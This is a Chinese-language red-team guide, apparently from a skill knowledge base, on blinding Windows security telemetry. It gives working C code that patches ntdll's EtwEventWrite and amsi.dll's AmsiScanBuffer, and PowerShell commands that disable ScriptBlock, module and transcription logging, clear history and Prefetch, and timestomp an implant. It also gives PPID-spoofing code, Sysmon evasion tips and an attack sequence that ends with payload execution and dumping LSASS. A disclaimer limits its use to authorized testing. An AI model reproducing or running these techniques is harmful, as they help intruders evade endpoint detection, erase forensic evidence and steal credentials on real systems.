---
title: 遥测致盲：ETW / AMSI / 反取证
summary: ETW provider 结构与四种 patch 方法、AMSI bypass 三级方案、PowerShell/Sysmon/时间戳反取证组合、操作顺序 OPSEC 纪律
phase: reverse
vuln_class: [edr, defense-evasion, etw, amsi]
---

# 遥测致盲：ETW / AMSI / 反取证

> 来源：reverse-skill 1.0.1 收编改编（2026-09-30，MIT，见 `../../licenses/`）。
> **仅限授权红队 / 对抗演练 / 自有产品测试，禁止用于未授权目标。**
> EDR 的检测能力很大程度依赖 ETW（Event Tracing for Windows）与 AMSI
> （Antimalware Scan Interface）两条遥测管道。本篇汇总针对两条管道的红队对策，
> 并补充 Sysmon / PowerShell logging / 时间戳 spoof 等反取证组合。
> 对照 MITRE ATT&CK：T1562.001 / T1562.002 / T1562.006 / T1070 / T1027。

## 1. ETW 内部结构

ETW 是 Windows 内置高性能事件追踪框架，EDR 用它做「轻量内核遥测」。红队最关心的
provider：

| Provider GUID | 名称 | 谁在用 |
|--------------|------|--------|
| `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` | Microsoft-Windows-Threat-Intelligence (ETW-TI) | Defender、MDE、第三方 EDR |
| `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}` | Microsoft-Antimalware-Scan-Interface | Defender AMSI 上报 |
| `{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}` | Microsoft-Windows-Kernel-Process | 进程 / 线程基础事件 |
| `{2839FF94-8F12-4E1B-82E3-AF7AF77A450F}` | Microsoft-Windows-DotNETRuntime | .NET 加载、JIT |
| `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}` | .NET CLR | CLR 启动 |

### 关键用户态 API 与调用链

| API | DLL | 作用 |
|-----|-----|------|
| `EtwEventWrite` | `ntdll.dll` | 写事件（最常用） |
| `EtwEventWriteFull` / `EtwEventWriteEx` | `ntdll.dll` | 扩展版本 |
| `NtTraceEvent` | `ntdll.dll` | EtwEventWrite 底层 |
| `NtTraceControl` | `ntdll.dll` | 控制 trace session（启/停/查询 provider） |
| `EtwEventEnabled` | `ntdll.dll` | provider 是否启用 |
| `EtwEventRegister` | `ntdll.dll` | 注册 provider |

```text
应用代码 EventWrite(...)
  → 微软封装 (TraceLogging API)
  → ntdll!EtwEventWrite[Full|Ex]
  → ntdll!NtTraceEvent (syscall)
  → nt!NtTraceEvent (内核)
  → 内核 ETW core → 消费端（EDR 用户态进程订阅 session）
```

## 2. ETW Patch 四种方法

### 方法 A：EtwEventWrite head patch

直接把 `ntdll!EtwEventWrite` 入口改成立即返回成功：

```text
patch 后（x64）：33 C0 (xor eax,eax) + C3 (ret)   ; STATUS_SUCCESS = 0
```

```c
BOOL PatchEtwEventWrite(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };   // xor eax,eax; ret
    DWORD oldProt = 0;
    // 注意：VirtualProtect 自身可能被 hook → 用 indirect syscall 版本
    if (!VirtualProtect(pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt))
        return FALSE;
    memcpy(pEtw, patch, sizeof(patch));
    VirtualProtect(pEtw, sizeof(patch), oldProt, &oldProt);
    return TRUE;
}
```

**OPSEC 警告**：写 ntdll 内存本身是 ETW-TI 监控的事件源。必须**先用 indirect
syscall + 绕过 NtProtectVirtualMemory hook 后再 patch**，否则 patch 还没生效
EDR 就已收到告警。

### 方法 B：EtwEventEnabled always-false

更隐蔽：不改 `EtwEventWrite`，让 `EtwEventEnabled` 永远返回 FALSE——应用层自己
判断「provider 没开」→ 不调 `EtwEventWrite`。对内存 hash 完整性检查更友好
（很多 EDR 校验 `EtwEventWrite` 字节）：

```c
BYTE patch[] = { 0x32, 0xC0, 0xC3 };   // xor al,al; ret
```

### 方法 C：NtTraceControl 关 provider

用 syscall 直接关 EDR session（不动 ntdll 字节，但侵入式）：

```c
// NtTraceControl(EtwpStopTrace, ...)，需要 SeSystemProfilePrivilege 或更高
```

实战较少用：关 session 本身触发「ETW provider stopped」事件被另一条管道感知；
需要高权限。

### 方法 D：内核态 ETW patch（仅在已有 BYOVD/内核读写时）

```text
nt!EtwpEventTracingProviderEnableInfo
nt!EtwThreatIntProvRegHandle
直接置 0 让所有 ETW-TI 事件被丢弃
```

属于 BYOVD 阶段技术，本篇不深入。

## 3. AMSI Bypass

AMSI 是 Windows 提供给 PowerShell / .NET / WMI / VBA 执行脚本前做反病毒扫描的
接口。红队最常碰到 PowerShell + AMSI。

### 经典 AmsiScanBuffer Patch

```c
// amsi.dll!AmsiScanBuffer 入口写：
//   mov eax, 0x80070057 (E_INVALIDARG) + ret
BOOL PatchAmsi(void) {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (!h) return FALSE;
    FARPROC p = GetProcAddress(h, "AmsiScanBuffer");
    if (!p) return FALSE;

    BYTE patch64[] = { 0xB8, 0x57, 0x00, 0x07, 0x80,   // mov eax, 0x80070057
                       0xC3 };                          // ret
    DWORD old = 0;
    VirtualProtect(p, sizeof(patch64), PAGE_EXECUTE_READWRITE, &old);
    memcpy(p, patch64, sizeof(patch64));
    VirtualProtect(p, sizeof(patch64), old, &old);
    return TRUE;
}
```

### 进阶方案 1：Hardware Breakpoint AMSI Bypass

不动 amsi.dll 内存（不触发完整性扫描）：

```text
1. AddVectoredExceptionHandler
2. 在 AmsiScanBuffer 入口设 DR0
3. VEH 命中时设置 RAX = 0x80070057、RIP = ret 指令地址、RSP += 8
4. ContinueExecution
```

与 [unhook-techniques.md](unhook-techniques.md) 的 HWBP Blindside 同一套基础设施，
可共用 VEH。

### 进阶方案 2：AmsiContext / AmsiSession 损坏

构造畸形 `AmsiContext` 结构让内部校验失败提前返回 success：

```text
// AmsiContext 头部应为 "AMSI" 魔数
// 改成 "XXXX" → AmsiScanBuffer 校验失败但返回 S_OK + AMSI_RESULT_CLEAN
```

### 进阶方案 3：Reflective 加载副本 amsi.dll

不用系统 amsi.dll，把干净副本反射加载到自己进程并重定向 PowerShell 引擎对 AMSI
的调用。适用于已在加载阶段拦截 PowerShell.exe 启动的高级 EDR。

## 4. 反取证：清除痕迹

### PowerShell ScriptBlock Logging 关闭

```powershell
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
    -Name 'EnableScriptBlockLogging' -Value 0 -Force
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' `
    -Name 'EnableModuleLogging' -Value 0 -Force
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
    -Name 'EnableTranscripting' -Value 0 -Force
```

### 清 history / Prefetch / ETL

```powershell
Clear-History
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue

Remove-Item 'C:\Windows\Prefetch\implant*.pf' -Force        # 需 SYSTEM

# 直接删 .evtx 会触发 "log cleared" (Event ID 1102)；
# 更隐蔽：内存中 patch wevtsvc.dll 的 EventLog API（T1070.001）
```

### 时间戳 spoof (T1070.006)

```powershell
$f = 'C:\Windows\Temp\implant.dll'; $ref = 'C:\Windows\System32\notepad.exe'
(Get-Item $f).CreationTime   = (Get-Item $ref).CreationTime
(Get-Item $f).LastWriteTime  = (Get-Item $ref).LastWriteTime
(Get-Item $f).LastAccessTime = (Get-Item $ref).LastAccessTime
```

## 5. Sysmon 监控规避

Sysmon 是社区最常见的免费遥测（很多企业用 olaf 配置）。关键事件：

| Event ID | 含义 |
|----------|------|
| 1 | ProcessCreate（含 PPID、CommandLine、Hash） |
| 7 | ImageLoad（DLL 加载） |
| 8 | CreateRemoteThread |
| 10 | ProcessAccess（OpenProcess） |
| 11 | FileCreate |
| 12/13/14 | 注册表 |
| 22 | DNS Query |
| 25 | ProcessTampering（image hollowing） |

### 规避思路

1. **不创建新进程**——全部在已注入进程内行动，避开 Event ID 1
2. **PPID Spoof**——`UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)`
   把 PPID 设为 `explorer.exe`：

```c
STARTUPINFOEX si = {0};
PROCESS_INFORMATION pi = {0};
SIZE_T size = 0;
HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, g_explorerPid);

si.StartupInfo.cb = sizeof(STARTUPINFOEX);
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);
CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```

3. **Unbacked memory + 不动镜像**——Process Hollowing 已被 Event ID 25 捕获；
   首选 module stomping（覆盖已加载合法 DLL 的节区）或 dirty vanity，配合 PPID spoof
4. **不要远程线程**——避免 Event ID 8；用 `NtCreateThreadEx` 在自己进程内执行 /
   APC / Early Bird APC
5. **DNS 走 DoH / HTTPS**——避免 Event ID 22

## 6. 让事件像合法软件

即使某些场景必须 spawn child：

- CommandLine 改成与合法软件相似的格式
- PPID spoof 到 services.exe（伪装 SCM 启动的服务）
- module stomping 把 implant 代码放进签名 DLL 内存空间（改 Image hash）
- 配合 CallStackSpoofer：Sysmon 即使开 EnableCallTracing 也看不到 implant 帧

## 7. 实战 OPSEC：操作顺序（错了先告警）

```text
正确顺序：
1. AMSI bypass (HWBP 优先，避免写 amsi.dll)
   ─── .NET / PowerShell 装载 implant 时不被扫
2. ETW patch (先 patch EtwEventWrite，再做任何 syscall)
   ─── 关掉自身后续动作的遥测
3. NtProtectVirtualMemory 用 indirect syscall 调用
   ─── 准备好「安全的」内存权限切换通道
4. Unhook ntdll (Peruns Fart) 或 enable indirect syscall
   ─── 抹掉用户态 hook
5. Call stack spoof setup
   ─── 准备好之后所有 syscall 的伪栈
6. 实际 payload 执行 (注入 / 横向 / dump LSASS)
7. 清痕迹 (PowerShell history / Prefetch / 时间戳)

错误示例：
❌ 先 unhook ntdll → ETW-TI 立即上报 PROTECTVM → SOC 已收到告警
❌ 先 dump LSASS → AMSI/ETW 都没压 → 高置信 T1003.001 告警
✅ AMSI → ETW → unhook → spoof → payload
```

## 参考

ETW Portal: https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal ·
ETW Patching: https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/ ·
AMSI Bypass 大全: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell ·
Sysmon olaf 配置: https://github.com/olafhartong/sysmon-modular ·
Ekko: https://github.com/Cracked5pider/Ekko ·
Foliage: https://github.com/SecIdiot/FOLIAGE

三件套（hook 调研 → unhook → 遥测致盲）完成后，回到技能 edr-hook-rev 的验证
步骤在 sandbox 验证，再进入下一攻击阶段。
